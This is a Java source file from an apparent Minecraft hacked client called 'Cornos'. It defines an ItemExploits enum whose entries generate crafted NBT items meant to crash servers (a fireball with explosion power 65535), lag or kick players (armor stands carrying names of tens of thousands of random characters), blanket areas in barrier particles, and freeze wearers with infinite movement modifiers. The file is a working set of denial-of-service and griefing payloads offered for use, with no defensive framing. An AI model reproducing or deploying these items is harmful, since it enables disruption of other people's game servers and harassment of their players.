package me.zeroX150.cornos.etc;

import me.zeroX150.cornos.etc.helper.Rnd;
import net.minecraft.enchantment.Enchantments;
import net.minecraft.entity.EquipmentSlot;
import net.minecraft.entity.attribute.EntityAttributeModifier;
import net.minecraft.entity.attribute.EntityAttributes;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.text.Text;

import java.util.UUID;
import java.util.concurrent.Callable;

public enum ItemExploits {
    SERVER_CRASH_FIREBALL(() -> {
        ItemStack itemStack = new ItemStack(Items.BAT_SPAWN_EGG);
        itemStack.setCustomName(Text.of("§r§cOuch. §4Generated by §lCornos"));
        CompoundTag compoundTag = itemStack.getOrCreateSubTag("EntityTag");
        ListTag listTag = new ListTag();
        listTag.add(DoubleTag.of(0));
        listTag.add(DoubleTag.of(-0.5));
        listTag.add(DoubleTag.of(0));
        compoundTag.put("power", listTag);
        compoundTag.put("id", StringTag.of("minecraft:fireball"));
        compoundTag.put("ExplosionPower", DoubleTag.of(65535));
        return itemStack;
    }), BLOCKBAN(() -> {
        ItemStack itemStack = new ItemStack(Items.BAT_SPAWN_EGG);
        itemStack.setCustomName(Text.of("§r§cBlockban. §4Generated by §lCornos"));
        CompoundTag compoundTag = itemStack.getOrCreateSubTag("EntityTag");
        compoundTag.put("id", StringTag.of("minecraft:area_effect_cloud"));
        compoundTag.put("Particle", StringTag.of("barrier"));
        compoundTag.put("Radius", FloatTag.of(16777216f));
        compoundTag.put("RadiusPerTick", FloatTag.of(0f));
        compoundTag.put("Duration", IntTag.of(1310700));
        compoundTag.put("WaitTime", IntTag.of(60));
        return itemStack;
    }), LAGMOR_STAND(() -> {
        ItemStack itemStack = new ItemStack(Items.ARMOR_STAND);
        itemStack.setCustomName(Text.of("§r§cLagmor stand. §4Generated by §lCornos"));
        CompoundTag compoundTag = itemStack.getOrCreateSubTag("EntityTag");
        compoundTag.put("CustomName", StringTag.of("\"" + Rnd.rndAscii(32000) + "\""));
        compoundTag.put("CustomNameVisible", ByteTag.of(true));
        return itemStack;
    }), KICK_STAND(() -> {
        ItemStack itemStack = new ItemStack(Items.ARMOR_STAND);
        CompoundTag compoundTag = itemStack.getOrCreateTag();
        compoundTag.put("HideFlags", IntTag.of(63));
        CompoundTag compoundTag1 = new CompoundTag();
        compoundTag1.put("CustomName", StringTag.of("{\"text\":\"" + Rnd.rndAscii(52731) + "\",\"obfuscated\":true}"));
        compoundTag1.put("Invulnerable", ByteTag.of(true));
        compoundTag1.put("Invisible", ByteTag.of(true));
        compoundTag1.put("CustomNameVisible", ByteTag.of(true));
        compoundTag.put("EntityTag", compoundTag1);
        itemStack.addEnchantment(Enchantments.PROTECTION, 1);
        itemStack.setCustomName(Text.of("§r§cKick stand. §4Generated by §lCornos"));
        return itemStack;
    }), NO_MOVE_HELMET(() -> {
        ItemStack itemStack = new ItemStack(Items.LEATHER_HELMET);
        itemStack.addAttributeModifier(EntityAttributes.GENERIC_MOVEMENT_SPEED,
                new EntityAttributeModifier(
                        UUID.nameUUIDFromBytes(
                                new byte[]{(byte) 1772998660, (byte) 874858241, (byte) -1911483451, (byte) 795787135}),
                        "generic.movement_speed", Double.POSITIVE_INFINITY + 1,
                        EntityAttributeModifier.Operation.fromId(0)),
                EquipmentSlot.HEAD);
        itemStack.addAttributeModifier(EntityAttributes.GENERIC_MOVEMENT_SPEED,
                new EntityAttributeModifier(UUID.nameUUIDFromBytes(
                        new byte[]{(byte) -774122372, (byte) -1202042950, (byte) -1378952527, (byte) -1780667942}),
                        "generic.movement_speed", Double.NEGATIVE_INFINITY - 1,
                        EntityAttributeModifier.Operation.fromId(0)),
                EquipmentSlot.HEAD);
        CompoundTag compoundTag = itemStack.getOrCreateTag();
        compoundTag.put("HideFlags", IntTag.of(71));
        compoundTag.put("Unbreakable", ByteTag.of(true));
        itemStack.addEnchantment(Enchantments.PROTECTION, 1);
        itemStack.setCustomName(Text.of("§r§cTroll helmet. §4Generated by §lCornos"));
        return itemStack;
    }), NO_ENTITY_KILL(() -> {
        ItemStack itemStack = new ItemStack(Items.BAT_SPAWN_EGG);
        itemStack.setCustomName(Text.of("§r§cNo Entity Kill. §4Generated by §lCornos"));
        CompoundTag compoundTag = itemStack.getOrCreateTag();
        CompoundTag compoundTag1 = new CompoundTag();
        compoundTag1.put("LootTable", StringTag.of(""));
        compoundTag1.putString("id", "minecraft:chest_minecart");
        compoundTag1.putByte("Invulnerable", (byte) 1);
        compoundTag1.putByte("Invisible", (byte) 1);
        compoundTag1.putByte("NoGravity", (byte) 1);
        compoundTag.put("EntityTag", compoundTag1);
        return itemStack;
    }), BIG_FIREWORK(() -> {
        ItemStack is = new ItemStack(Items.FIREWORK_ROCKET);
        is.setCustomName(Text.of("§r§cBig firework. §4Generated by §lCornos"));
        is.getOrCreateTag().put("HideFlags", IntTag.of(32));
        CompoundTag fireworks = is.getOrCreateSubTag("Fireworks");
        fireworks.put("Flight", IntTag.of(1));
        ListTag explosions = new ListTag();
        for(int i = 0;i<100;i++) {
            IntArrayTag colors = new IntArrayTag(new int[0]);
            for(int ii=0;ii<20;ii++) colors.add(IntTag.of((int) Math.floor(Math.random()*0xFFFFFF)));
            CompoundTag current = new CompoundTag();
            current.put("Type", IntTag.of((int) Math.floor(Math.random()*4)));
            current.put("Flicker", IntTag.of(1));
            current.put("Trail", IntTag.of(1));
            current.put("Colors", colors);
            explosions.add(current);
        }
        fireworks.put("Explosions", explosions);
        return is;
    });

    Callable<ItemStack> generate;

    ItemExploits(java.util.concurrent.Callable<ItemStack> generator) {
        this.generate = generator;
    }

    public ItemStack get() {
        ItemStack ret = null;
        try {
            ret = this.generate.call();
        } catch (Exception ignored) {
        }
        return ret;
    }
}
